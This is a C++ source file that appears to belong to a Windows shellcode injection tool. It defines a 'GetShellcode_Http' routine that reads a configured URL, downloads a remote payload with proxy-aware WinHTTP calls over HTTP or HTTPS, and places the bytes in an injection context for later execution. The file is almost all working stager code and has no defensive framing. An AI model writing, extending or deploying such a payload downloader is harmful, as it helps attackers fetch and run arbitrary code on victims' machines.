#pragma comment(lib, "winhttp.lib")

#include "phases/shellcode/fetch_http.h"
#include "config.h"
#include "debug.h"
#include <cstdio>
#include <Windows.h>
#include <winhttp.h>
#include <vector>
#include <stdexcept>

BOOL GetShellcode_Http(INJECT_CTX* ctx) {
    UrlParts shellcodeUrl;
    if (ParseUrl(SHELLCODE_HTTP_URL, shellcodeUrl)) {
        ctx->shellcode = download(shellcodeUrl);
        ctx->shellcodeSize = ctx->shellcode.size();
        DBG("Fetched %zu shellcode bytes.", ctx->shellcodeSize);
        return !ctx->shellcode.empty();
    }
    else {
        DBG("Invalid shellcode URL: %ls", SHELLCODE_HTTP_URL);
        return FALSE;
    }
}


bool ParseUrl(LPCWSTR url, UrlParts& out) {
    memset(&out, 0, sizeof(out));
    if (swscanf(url, L"%[^:]://%[^/]/%[^?]", out.scheme, out.host, out.path) < 2)
        return false;
    return true;
}

std::vector<BYTE> download(UrlParts shellcodeUrl) {
    bool isHttps = (wcscmp(shellcodeUrl.scheme, L"https") == 0);

    if (!isHttps && wcscmp(shellcodeUrl.scheme, L"http") != 0) {
        DBG("Invalid scheme in URL");
        return {};
    }

    // initialise session
    HINTERNET hSession;
    if (isHttps) {
        hSession = WinHttpOpen(
            NULL,
            WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl
    }
    else {
        hSession = WinHttpOpen(
            NULL,
            WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);
    }

    // create session for target
    HINTERNET hConnect;
    if (isHttps) {
        hConnect = WinHttpConnect(
            hSession,
            shellcodeUrl.host,
            INTERNET_DEFAULT_HTTPS_PORT,            // port 443
            0);
    }
    else {
        hConnect = WinHttpConnect(
            hSession,
            shellcodeUrl.host,
            INTERNET_DEFAULT_HTTP_PORT,            // port 80
            0);
    }

    // create request handle
    HINTERNET hRequest;
    if (isHttps) {
        hRequest = WinHttpOpenRequest(
            hConnect,
            L"GET",
            shellcodeUrl.path,
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);                   // ssl
    }
    else {
        hRequest = WinHttpOpenRequest(
            hConnect,
            L"GET",
            shellcodeUrl.path,
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);                   // ssl
    }

    // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    WinHttpQueryHeaders(
        hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &statusCode,
        &statusCodeSize,
        WINHTTP_NO_HEADER_INDEX);

    DBG("HTTP status: %d", statusCode);

    if (statusCode != 200) {
        DBG("Unexpected HTTP status");
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return {};
    }

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {
        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}